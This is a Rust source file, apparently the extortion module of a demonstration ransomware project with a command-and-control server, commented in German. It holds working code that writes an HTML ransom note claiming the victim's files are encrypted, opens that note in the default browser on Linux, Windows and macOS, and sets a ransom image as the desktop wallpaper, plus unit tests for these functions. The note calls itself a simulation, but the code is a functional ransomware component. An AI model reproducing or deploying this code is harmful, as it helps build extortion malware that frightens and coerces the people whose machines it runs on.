use anyhow::{Context, Result};
use std::fs;
use std::io::Write;
use std::path::Path;
use wallpaper;

/// Gibt den HTML-Inhalt für die Ransom-Note zurück
/// Ausgelagert, um den Inhalt isoliert zu testen oder zu ändern
fn get_ransom_html_content() -> &'static str {
    r#"
    <!doctype html>
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <style>
                body { background-color: #8b0000; color: white; font-family: 'courier new', monospace; text-align: center; padding: 50px; }
                .container { border: 3px solid white; padding: 20px; background-color: black; max-width: 800px; margin: 0 auto; }
                h1 { color: red; text-transform: uppercase; font-size: 3em; }
                p { font-size: 1.2em; }
                .button {
                    background-color: red; color: white; border: 2px solid white; 
                    padding: 15px 32px; text-align: center; text-decoration: none; 
                    display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;
                    font-weight: bold;
                }
                .button:hover { background-color: white; color: red; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ your files are encrypted ⚠️</h1>
                <p>don't panic. this is a simulation.</p>
                <p>all your documents, photos, and databases have been encrypted with strong military-grade encryption.</p>
                <br>
                <p>to restore your files, you need the unique private key that we have generated for you.</p>
                
                <hr>
                <h3>how to decrypt?</h3>
                <p>since this is a c2-demo, you cannot decrypt directly from the browser.</p>
                <p><b>please contact the operator (c2 server) and send the command:</b></p>
                <h2>decrypt</h2>
                
                <!-- visueller button -->
                <button class="button" onclick="alert('please send the command \'decrypt\' in your c2 console to trigger the rust process!')">
                    decrypt files now
                </button>
            </div>
        </body>
    </html>
    "#
}

/// Schreibt die Ransom-Note auf die Festplatte.
///
/// Args:
/// - base_path: Basisverzeichnis für die Ablage der Datei
///
/// Returns:
/// - Ok(PathBuf): vollständiger Pfad zur geschriebenen Ransom-Note
/// - Err(anyhow::Error): Fehler bei Pfadbildung oder Dateischreiben
pub fn write_ransom_note(base_path: &Path) -> Result<std::path::PathBuf> {
    let note_path = base_path.join("README_DECRYPT.html");

    // Inhalt der Ransom-Note abrufen
    let content = get_ransom_html_content();

    fs::write(&note_path, content)
        .with_context(|| format!("Konnte Ransom-Note nicht schreiben (Path: {:?}", note_path))?;

    Ok(note_path)
}

/// Öffnet eine Datei im Standard-Browser (Best-Effort).
///
/// Args:
/// - note_path: Pfad zur Ransom-Note
///
/// Returns:
/// - () (keine Rückgabe; Fehler werden bewusst ignoriert)
pub fn open_ransom_note_in_browser(note_path: &Path) {
    // Versuch die Datei zu öffnen
    #[cfg(target_os = "linux")]
    let _ = std::process::Command::new("xdg-open")
        .arg(&note_path)
        .status();
    #[cfg(target_os = "windows")]
    let _ = std::process::Command::new("cmd")
        .args(["/C", "start", "", &note_path.to_string_lossy()])
        .status();
    #[cfg(target_os = "macos")]
    let _ = std::process::Command::new("open").arg(&note_path).status();
}

/// Erstellt die Ransom-Note und öffnet sie im Browser.
///
/// Args:
/// - base_path: Zielverzeichnis für die Note
///
/// Returns:
/// - Ok(()): Note erfolgreich erstellt (Öffnen best-effort)
/// - Err(anyhow::Error): Fehler beim Schreiben der Note
pub fn create_and_show_ransom_note(base_path: &Path) -> Result<()> {
    // Schreiben
    let note_path = write_ransom_note(base_path)?;

    // Öffnen
    #[cfg(not(test))]
    open_ransom_note_in_browser(&note_path);

    Ok(())
}

/// Ändert das Desktophintergrundbild des Systems permanent.
///
/// Diese Funktion sucht im angegebenen `base_path` nach einer Datei namens
/// `ransom_wallpaper.jpg`. Wenn diese nicht existiert, wird sie aus der Binary extrahiert.
/// Anschließend wird der **absolute Pfad** ermittelt und als Wallpaper gesetzt.
///
/// # Arguments
///
/// * `base_path` - Der Pfad zu dem Verzeichnis, in dem das Bild liegt.
///
/// # Returns
///
/// `true` bei Erfolg (Datei geschrieben und Befehl abgesetzt), sonst `false`.
///
/// # Example
///
/// ```no_run
/// use std::path::Path;
/// // Wir müssen dem Doc-Test sagen, wo er das Modul findet (angenommen crate root)
/// // Oder wir nutzen den Modulnamen, falls public.
/// // Hier simulieren wir den Aufruf:
/// let path = Path::new(".");
/// // crate::extortion::set_ransom_wallpaper(path);
/// ```
pub fn set_ransom_wallpaper(base_path: &Path) -> bool {
    let image_name = "ransom_wallpaper.jpg"; // Name muss konsistent sein
    let image_path = base_path.join(image_name);

    // Dropping: Bild extrahieren, falls es nicht existiert
    if !image_path.exists() {
        // Pfad relativ zu dieser Source-Datei (src/extortion.rs -> ../assets/)
        const IMAGE_BYTES: &[u8] = include_bytes!("../assets/ransom_wallpaper.jpg");

        if let Ok(mut file) = fs::File::create(&image_path) {
            if let Err(e) = file.write_all(IMAGE_BYTES) {
                eprintln!("[EXTORTION] Fehler beim Schreiben des Bildes: {}", e);
                return false;
            }
        } else {
            return false;
        }
    }

    // Das OS braucht zwingend einen absoluten Pfad (C:\... oder /home/...),
    // relative Pfade (./bild.jpg) werden von der Wallpaper-API ignoriert.
    let absolute_path = match fs::canonicalize(&image_path) {
        Ok(p) => p,
        Err(_) => {
            // Fallback: Wenn canonicalize fehlschlägt, relativen Pfad versuchen
            image_path
        }
    };

    // Wallpaper setzen
    if let Some(path_str) = absolute_path.to_str() {
        println!(
            "[EXTORTION] Setze Wallpaper auf absoluten Pfad: {}",
            path_str
        );

        match wallpaper::set_from_path(path_str) {
            Ok(_) => {
                let _ = wallpaper::set_mode(wallpaper::Mode::Crop);
                return true;
            }
            Err(e) => {
                println!("[EXTORTION] Wallpaper API Fehler: {}", e);
                return false;
            }
        }
    }

    false
}

// Tests
#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use std::fs;

    // Hilfsfunktion: Erstellt einen temporären Ordner für Tests
    fn get_temp_dir() -> std::path::PathBuf {
        let mut dir = env::temp_dir();
        dir.push("rust_malware_test_extortion");
        // Versuchen zu erstellen, Fehler ignorieren wenn schon da
        let _ = fs::create_dir(&dir);
        dir
    }

    // Testen, ob der HTML-Inhalt stimmt
    #[test]
    fn test_html_content_integrity() {
        let html = get_ransom_html_content();
        assert!(
            html.contains("your files are encrypted"),
            "HTML Titel fehlt"
        );
        assert!(
            html.contains("background-color: #8b0000"),
            "CSS Styling fehlt"
        );
        assert!(html.contains("decrypt files now"), "Button Text fehlt");
    }

    // Testen ob die Datei korrekt erstellt wird
    #[test]
    fn test_file_creation() {
        let temp_dir = get_temp_dir();

        let result = write_ransom_note(&temp_dir);
        assert!(result.is_ok(), "Funktion sollte erfolgreich durchlaufen");

        let file_path = result.unwrap();
        assert!(
            file_path.exists(),
            "Datei wurde nicht physikalisch erstellt"
        );
        assert!(
            file_path.ends_with("README_DECRYPT.html"),
            "Dateiname ist falsch"
        );

        // Aufräumen (Datei löschen)
        let _ = fs::remove_file(file_path);
    }

    // Testen, ob der Dateiinhalt korrekt geschrieben wurde
    #[test]
    fn test_file_content_match() {
        let temp_dir = get_temp_dir();
        let file_path = write_ransom_note(&temp_dir).expect("Schreiben fehlgeschlagen");

        // Datei wieder einlesen
        let content_on_disk = fs::read_to_string(&file_path).expect("Lesen fehlgeschlagen");
        let expected_content = get_ransom_html_content();

        assert_eq!(
            content_on_disk, expected_content,
            "Gespeicherter Inhalt stimmt nicht mit Vorlage überein"
        );

        let _ = fs::remove_file(file_path);
    }

    // Fehlerbehandlung bei ungülgtigem Pfad testen
    #[test]
    fn test_write_permission_error() {
        // Wir versuchen in einen Pfad zu schreiben, der hoffentlich nicht existiert oder root gehört
        // Unter Linux ist /root oft gesperrt, unter Windows ist es schwieriger einen garantiert gesperrten Pfad zu finden.
        // Ein nicht existierendes Verzeichnis als Base sollte reichen, wenn fs::write das Verzeichnis erwartet.

        let invalid_path = Path::new("/pfad/der/ganz/sicher/nicht/existiert/xyz123");

        // Die Funktion nutzt fs::write, was fehlschlägt, wenn der Ordner nicht da ist.
        let result = write_ransom_note(invalid_path);

        assert!(
            result.is_err(),
            "Schreiben in nicht-existenten Ordner sollte fehlschlagen"
        );

        // Prüfen, ob der Fehlerkontext stimmt (anyhow context)
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("Konnte Ransom-Note nicht schreiben"),
            "Falsche Fehlermeldung: {}",
            err_msg
        );
    }

    #[test]
    fn test_wallpaper_missing_file() {
        let temp_dir = std::env::temp_dir();
        // Wir nutzen einen Pfad, wo sicher kein Bild liegt
        let result = set_ransom_wallpaper(&temp_dir.join("non_existent_folder"));
        assert_eq!(result, false, "Sollte false sein, wenn Bild fehlt");
    }
}
